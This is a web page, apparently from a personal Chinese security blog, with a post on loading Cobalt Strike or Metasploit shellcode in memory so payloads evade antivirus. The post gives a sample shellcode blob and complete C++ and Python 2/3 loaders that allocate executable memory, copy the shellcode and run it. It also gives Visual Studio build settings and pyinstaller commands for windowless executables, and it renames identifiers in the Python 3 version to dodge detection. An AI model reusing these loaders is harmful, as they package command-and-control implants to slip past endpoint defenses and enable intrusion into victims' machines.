@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    内存注入Shellcode实现msf与cs免杀 |  GuoKer&#39;Blog | o0o0.club | 一个小站，记录自己。分享一些有趣的东西，虽然不一定有人看。(*^__^*) 嘻嘻……
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="https://photo.o0o0.club/g.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="Guoker's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-内存注入shellcode实现msf与cs免杀"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  内存注入Shellcode实现msf与cs免杀
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/" class="article-date">
+  <time datetime="2019-11-12T16:00:00.000Z" itemprop="datePublished">2019-11-13</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">893</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">4 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文中所使用的shellcode均使用cs生成，msf同理<br>示例shellcode（打开Windows计算器calc.exe）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xb8\x82\x0a\x8d\x38\xd9\xc6\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x23\x31\x42\x12\x83\xea\xfc\x03\xc0\x04\x6f\xcd\x38\xf0\x2b\x2e\xc0\x01\x3f\x6b\xfc\x8a\x43\x71\x84\x8d\x54\xf2\x3b\x96\x21\x5a\xe3\xa7\xde\x2c\x68\x93\xab\xae\x80\xed\x6b\x29\xf0\x8a\xac\x3e\x0f\x52\xe6\xb2\x0e\x96\x1c\x38\x2b\x42\xc7\xc5\x3e\x8f\x8c\x99\xe4\x4e\x78\x43\x6f\x5c\x35\x07\x30\x41\xc8\xfc\x45\x65\x41\x03\xb2\x1f\x09\x20\x40\xe3\x83\xe8\x2c\x68\xa3\xd8\x29\xae\x5c\x15\xba\x6f\x91\xae\xcc\x73\x04\x3b\x44\x84\xbd\x35\x1f\x14\xf1\x46\x1f\x15\x79\x2e\x23\x4a\x4c\x59\x3b\x22\x27\x5d\x38\x0a\x4c\xce\x56\xf5\x6b\x0c\xd5\x61\x14\x2f\x93\x7c\x73\x2f\x44\xe3\x1a\xa3\xe9\xe4</span><br></pre></td></tr></table></figure>
+<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><p>在vs2015中新建项目<br><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573642036886.png"></p>
+<p><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573642073483.png"></p>
+<p>新建项目后添加源文件<br><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573642116788.png"></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buff[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(buff), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(Memory, buff, <span class="built_in"><span class="keyword">sizeof</span></span>(buff));</span><br><span class="line">	((<span class="built_in"><span class="keyword">void</span></span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将shellcode替换成自己的<br><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573642307141.png"></p>
+<p>在编译之前需要修改三处项目属性<br>PS:前两项由于我在vs2015出现的小问题，可忽略。</p>
+<p>1.VC++包含目录</p>
+<p>新建一个项目——打开项目属性页——在打开的选项卡中选择vc++目录–&gt;包含目录下拉条点击编辑：<br><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573642922261.png"></p>
+<p>目录选择下面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\Windows Kits\10\Include\10.0.10150.0\ucrt </span><br></pre></td></tr></table></figure>
+<p>点击确定后添加</p>
+<p><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573642960540.png"></p>
+<p>2.VC++库目录</p>
+<p>同第一步相同，将目录添加为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\Windows Kits\10\Lib\10.0.10150.0\ucrt\x86</span><br></pre></td></tr></table></figure>
+<p><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573643101063.png"></p>
+<p>3.C/C++ –&gt;代码生成 –&gt; 运行库</p>
+<p>将运行库修改为 多线程(/MT)<br><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573643148828.png"></p>
+<p>编译<br><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573643267417.png"></p>
+<p><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573643511172.png"><br>双击上线<br><img src="https://photo.o0o0.club/_%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/1573643755448.png"></p>
+<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>Python免杀效果更佳！</p>
+<h2 id="Python2"><a href="#Python2" class="headerlink" title="Python2"></a>Python2</h2><p>安装pyinstaller</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure>
+<p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,ctypes</span><br><span class="line">sb = <span class="built_in">bytearray</span>(<span class="string">&#x27;shellcode&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaac</span>():</span></span><br><span class="line">	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">											  ctypes.c_int(<span class="built_in">len</span>(sb)),</span><br><span class="line">											  ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">											  ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">	bufs = (ctypes.c_char * <span class="built_in">len</span>(sb)).from_buffer(sb)</span><br><span class="line">	ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">										 bufs,</span><br><span class="line">										 ctypes.c_int(<span class="built_in">len</span>(sb)))</span><br><span class="line">	ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">											 ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">											 ctypes.c_int(ptr),</span><br><span class="line">											 ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">											 ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">											 ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">	 </span><br><span class="line">	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	aaac()</span><br></pre></td></tr></table></figure>
+<p>将shellcode转成16进制(char To hex)然后替换代码第二行的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8820a8d38d9c6d97424f45a29c9b12331421283eafc03c0046fcd38f02b2ec0013f6bfc8a4371848d54f23b96215ae3a7de2c6893abae80ed6b29f08aac3e0f52e6b20e961c382b42c7c53e8f8c99e44e78436f5c35073041c8fc45654103b21f092040e383e82c68a3d829ae5c15ba6f91aecc73043b4484bd351f14f1461f15792e234a4c593b22275d380a4cce56f56b0cd561142f937c732f44e31aa3e9e4</span><br></pre></td></tr></table></figure>
+
+<p>编译之</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w sb.py</span><br></pre></td></tr></table></figure>
+<h2 id="Python3"><a href="#Python3" class="headerlink" title="Python3"></a>Python3</h2><p>安装pyinstaller</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure>
+<p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;Python 3.7.0&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> ctypes <span class="keyword">as</span> 胖胖的库</span><br><span class="line"><span class="class"><span class="keyword">class</span> 二狗子(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.神秘液体 = <span class="built_in">bytearray</span>(<span class="string">b&#x27;shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> 自己动(<span class="params">self,</span>):</span></span><br><span class="line">        <span class="comment">#print (&#x27;test&#x27;)</span></span><br><span class="line">        开天辟地 = 胖胖的库.windll.kernel32.VirtualAlloc(胖胖的库.c_int(<span class="number">0</span>),胖胖的库.c_int(<span class="built_in">len</span>(self.神秘液体)),胖胖的库.c_int(<span class="number">0x3000</span>),胖胖的库.c_int(<span class="number">0x40</span>))</span><br><span class="line">        <span class="comment">#VirtualAlloc(内存开始地址，分配内存的大小,分配内存的类型,分配内存的权限)</span></span><br><span class="line">        泰山压顶 = (胖胖的库.c_char * <span class="built_in">len</span>(self.神秘液体)).from_buffer(self.神秘液体)<span class="comment">#来源目标指针</span></span><br><span class="line">        胖胖的库.windll.kernel32.RtlMoveMemory(胖胖的库.c_int(开天辟地),泰山压顶,胖胖的库.c_int(<span class="built_in">len</span>(self.神秘液体)))</span><br><span class="line">        <span class="comment">#RtlMoveMemory(目标内存指针,来源内存指针,字节数)</span></span><br><span class="line">        水漫金山 = 胖胖的库.windll.kernel32.CreateThread(胖胖的库.c_int(<span class="number">0</span>),胖胖的库.c_int(<span class="number">0</span>),胖胖的库.c_int(开天辟地),胖胖的库.c_int(<span class="number">0</span>),胖胖的库.c_int(<span class="number">0</span>),胖胖的库.pointer(胖胖的库.c_int(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line">        胖胖的库.windll.kernel32.WaitForSingleObject(胖胖的库.c_int(水漫金山), 胖胖的库.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    实例化一个二狗子 = 二狗子()</span><br><span class="line">    实例化一个二狗子.自己动()</span><br></pre></td></tr></table></figure>
+<p>同python2一样直接替换shellcode（但不需要转成hex）编译之</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w sb2.py</span><br></pre></td></tr></table></figure>
+<p>PS:中文是我特地骚的</p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          交个朋友
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://o0o0.club/%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5shellcode%E5%AE%9E%E7%8E%B0msf%E4%B8%8Ecs%E5%85%8D%E6%9D%80/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/Virmach%20%E9%BB%91%E4%BA%94%E4%BC%98%E6%83%A0%E7%9B%91%E6%B5%8B%E8%84%9A%E6%9C%AC(%E5%88%A9%E7%94%A8server%E9%85%B1%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E6%94%B6%E4%BF%A1)/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Virmach 黑五优惠监测脚本(利用Server酱实现微信收信)
+          
+        </div>
+      </a>
+    
+    
+      <a href="/Kerberos%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Kerberos认证协议及漏洞复现笔记</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "JJV5SI6g6kCVO6UVgTIWnhT1-MdYXbMMI",
+    app_key: "Im4RXpbhuxnxUC2rWJq50eQN",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2017-2021
+        <i class="ri-heart-fill heart_icon"></i> GuoKer
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
+        <span class="division">|</span>
+        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="http://beian.miit.gov.cn/" target="_black">桂ICP备19000641号-1</a>
+        </li>
+        
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://v1.cnzz.com/z_stat.php?id=1277959436&amp;web_id=1277959436'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Guoker&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://github.com/GuoKerS/some_script/">辣鸡脚本</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>吹吹牛吗？</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://photo.o0o0.club/wx.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
